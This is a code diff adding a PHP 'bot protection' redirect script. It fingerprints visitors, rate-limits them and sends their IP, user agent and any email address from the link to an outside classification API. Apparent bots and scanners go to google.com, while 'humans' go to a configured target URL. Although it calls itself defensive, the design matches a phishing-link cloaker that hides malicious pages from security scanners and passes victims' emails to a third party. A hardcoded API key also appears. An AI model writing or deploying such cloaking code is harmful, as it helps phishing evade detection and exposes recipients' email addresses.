@@ -1,0 +1,275 @@
+<?php
+/*
+ *  Maximum Bot Protection Script
+ * This script provides multi-layered security against all types of bots
+ * 
+ * Security Features:
+ * - Server-side enforcement (cannot be bypassed by disabling JS)
+ * - Signed token validation
+ * - Rate limiting per IP
+ * - Device fingerprinting
+ * - Session integrity checks
+ * - Security headers (HSTS, CSP, X-Frame-Options)
+ * - Cache tampering protection
+ * - Direct URL access prevention
+ */
+
+session_start();
+
+// ============ CONFIGURATION ============
+$apiKey = 'ak_g2pmm444e1jmiosagn9ez9e5o3kbjqfsw';
+$humanUrl = 'https://human.com';
+$botUrl = 'https://google.com';
+$apiEndpoint = 'https://quantumroutes.org/api/classify';
+$cacheDuration = 600; // 10 minutes (shorter for better security)
+$rateLimitWindow = 60; // 1 minute
+$maxRequestsPerWindow = 10; // Max 10 requests per minute per IP
+
+// ============ SECURITY HEADERS ============
+header('X-Content-Type-Options: nosniff');
+header('X-Frame-Options: DENY');
+header('X-XSS-Protection: 1; mode=block');
+header('Referrer-Policy: strict-origin-when-cross-origin');
+header('Content-Security-Policy: default-src \'self\'; script-src \'self\' \'unsafe-inline\'; style-src \'self\' \'unsafe-inline\';');
+header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
+
+// ============ RATE LIMITING ============
+function checkRateLimit($ip) {
+    global $rateLimitWindow, $maxRequestsPerWindow;
+    
+    $rateLimitFile = sys_get_temp_dir() . '/qr_ratelimit_' . md5($ip);
+    $now = time();
+    
+    if (file_exists($rateLimitFile)) {
+        $data = json_decode(file_get_contents($rateLimitFile), true);
+        $windowStart = $data['window_start'] ?? 0;
+        $requestCount = $data['count'] ?? 0;
+        
+        if ($now - $windowStart < $rateLimitWindow) {
+            if ($requestCount >= $maxRequestsPerWindow) {
+                return false; // Rate limit exceeded
+            }
+            $data['count']++;
+        } else {
+            // New window
+            $data = ['window_start' => $now, 'count' => 1];
+        }
+    } else {
+        $data = ['window_start' => $now, 'count' => 1];
+    }
+    
+    file_put_contents($rateLimitFile, json_encode($data));
+    return true;
+}
+
+// ============ DEVICE FINGERPRINTING ============
+function generateDeviceFingerprint() {
+    $components = [
+        $_SERVER['HTTP_USER_AGENT'] ?? '',
+        $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
+        $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
+        $_SERVER['HTTP_ACCEPT'] ?? ''
+    ];
+    return hash('sha256', implode('|', $components));
+}
+
+// ============ TOKEN VALIDATION ============
+function generateSecureToken($visitorType, $fingerprint) {
+    global $apiKey;
+    $data = $visitorType . '|' . $fingerprint . '|' . time();
+    $signature = hash_hmac('sha256', $data, $apiKey);
+    return base64_encode($data . '|' . $signature);
+}
+
+function validateSecureToken($token, $fingerprint) {
+    global $apiKey, $cacheDuration;
+    
+    $decoded = base64_decode($token);
+    $parts = explode('|', $decoded);
+    
+    if (count($parts) !== 4) return false;
+    
+    list($visitorType, $storedFingerprint, $timestamp, $signature) = $parts;
+    
+    // Verify signature
+    $data = $visitorType . '|' . $storedFingerprint . '|' . $timestamp;
+    $expectedSignature = hash_hmac('sha256', $data, $apiKey);
+    
+    if (!hash_equals($expectedSignature, $signature)) return false;
+    
+    // Verify fingerprint matches
+    if (!hash_equals($storedFingerprint, $fingerprint)) return false;
+    
+    // Verify not expired
+    if (time() - $timestamp > $cacheDuration) return false;
+    
+    return $visitorType;
+}
+
+// ============ DETECT BROWSER & DEVICE FROM CLIENT ============
+// Get browser and device info from POST data (sent by JavaScript)
+$clientBrowser = $_POST['browser'] ?? null;
+$clientDevice = $_POST['device'] ?? null;
+
+// If browser/device data not yet collected, render page with JavaScript to collect it
+if (!$clientBrowser || !$clientDevice) {
+    ?>
+    <!DOCTYPE html>
+    <html><head><meta charset="UTF-8"><title>Redirecting...</title>
+    <style>body{margin:0;background:#fff}</style>
+    </head><body>
+    <form id="dataForm" method="POST" action="<?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?>" style="display:none;">
+        <input type="hidden" name="browser" id="browserInput">
+        <input type="hidden" name="device" id="deviceInput">
+    </form>
+    <script>
+    function detectBrowser(){const ua=navigator.userAgent;if(ua.indexOf("Firefox")>-1)return"Firefox";if(ua.indexOf("Edg")>-1)return"Edge";if(ua.indexOf("Chrome")>-1)return"Chrome";if(ua.indexOf("Safari")>-1)return"Safari";if(ua.indexOf("Trident")>-1||ua.indexOf("MSIE")>-1)return"IE";return"Unknown"}
+    function detectDevice(){const ua=navigator.userAgent;if(/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua))return"Tablet";if(/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua))return"Mobile";return"Desktop"}
+    document.getElementById("browserInput").value=detectBrowser();
+    document.getElementById("deviceInput").value=detectDevice();
+    document.getElementById("dataForm").submit();
+    </script></body></html>
+    <?php
+    exit;
+}
+
+// ============ MAIN SECURITY LOGIC ============
+$ip = $_SERVER['REMOTE_ADDR'];
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$deviceFingerprint = generateDeviceFingerprint();
+
+// SECURITY: If browser or device cannot be detected, classify as Bot immediately
+if ($clientBrowser === 'Unknown' || $clientDevice === 'Unknown') {
+    // Build redirect URL with query parameters
+    $redirectUrl = $botUrl;
+    if (!empty($_SERVER['QUERY_STRING'])) {
+        $separator = (strpos($redirectUrl, '?') !== false) ? '&' : '?';
+        $redirectUrl .= $separator . $_SERVER['QUERY_STRING'];
+    }
+    header('Location: ' . $redirectUrl);
+    exit('Unknown browser or device - classified as bot');
+}
+
+// Check rate limit
+if (!checkRateLimit($ip)) {
+    header('HTTP/1.1 429 Too Many Requests');
+    header('Retry-After: 60');
+    header('Location: ' . $botUrl);
+    exit('Rate limit exceeded');
+}
+
+// Default to Bot for maximum security
+$visitorType = 'Bot';
+$needsRevalidation = true;
+
+// Check for valid session token
+if (isset($_SESSION['qr_token']) && isset($_SESSION['qr_fingerprint'])) {
+    // Verify fingerprint hasn't changed (prevents session hijacking)
+    if (hash_equals($_SESSION['qr_fingerprint'], $deviceFingerprint)) {
+        $validatedType = validateSecureToken($_SESSION['qr_token'], $deviceFingerprint);
+        if ($validatedType !== false) {
+            $visitorType = $validatedType;
+            $needsRevalidation = false;
+        }
+    } else {
+        // Fingerprint mismatch - possible session hijacking attempt
+        session_destroy();
+        session_start();
+    }
+}
+
+// Revalidate with API if needed
+if ($needsRevalidation) {
+    // Extract email from query string (works for both GET and POST requests)
+    $email = null;
+    if (!empty($_SERVER['QUERY_STRING'])) {
+        parse_str($_SERVER['QUERY_STRING'], $queryParams);
+        $email = $queryParams['e'] ?? $queryParams['email'] ?? null;
+    }
+    
+    // Build API request with client-provided browser and device data
+    $requestData = [
+        'ip' => $ip,
+        'userAgent' => $userAgent
+    ];
+    
+    // Include browser and device from client if available
+    if ($clientBrowser) {
+        $requestData['browser'] = $clientBrowser;
+    }
+    if ($clientDevice) {
+        $requestData['deviceType'] = $clientDevice;
+    }
+    
+    // Include email if provided
+    if ($email) {
+        $requestData['email'] = $email;
+    }
+    
+    // Prepare JSON data
+    $jsonData = json_encode($requestData);
+    
+    // Initialize cURL with proper configuration
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $apiEndpoint,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => $jsonData,
+        CURLOPT_HTTPHEADER => [
+            'Content-Type: application/json',
+            'X-API-Key: ' . $apiKey,
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept: application/json',
+            'Cache-Control: no-cache'
+        ],
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_CONNECTTIMEOUT => 5,
+        CURLOPT_SSL_VERIFYPEER => true,
+        CURLOPT_FOLLOWLOCATION => false,
+        CURLOPT_MAXREDIRS => 0,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    ]);
+    
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    curl_close($ch);
+    
+    // Check for cURL errors or valid response
+    if (!$error && $httpCode === 200 && $response) {
+        $data = json_decode($response, true);
+        if (isset($data['visitor_type']) && $data['visitor_type'] === 'Human') {
+            $visitorType = 'Human';
+        }
+        
+        // Store secure token
+        $_SESSION['qr_token'] = generateSecureToken($visitorType, $deviceFingerprint);
+        $_SESSION['qr_fingerprint'] = $deviceFingerprint;
+        $_SESSION['qr_last_check'] = time();
+    }
+    // If API fails, $visitorType remains 'Bot' (fail-safe)
+}
+
+// ============ REDIRECT WITH SECURITY ============
+// Add anti-caching headers for bot protection
+header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+header('Pragma: no-cache');
+header('Expires: 0');
+
+// Build redirect URL with query parameters
+$redirectUrl = ($visitorType === 'Bot') ? $botUrl : $humanUrl;
+
+// Forward all query parameters from incoming URL
+if (!empty($_SERVER['QUERY_STRING'])) {
+    $separator = (strpos($redirectUrl, '?') !== false) ? '&' : '?';
+    $redirectUrl .= $separator . $_SERVER['QUERY_STRING'];
+}
+
+// Log security event (optional - uncomment to enable logging)
+// $logEntry = date('Y-m-d H:i:s') . " | IP: $ip | Type: $visitorType | UA: $userAgent\n";
+// file_put_contents('qr_access.log', $logEntry, FILE_APPEND);
+
+header('Location: ' . $redirectUrl);
+exit;
+?>
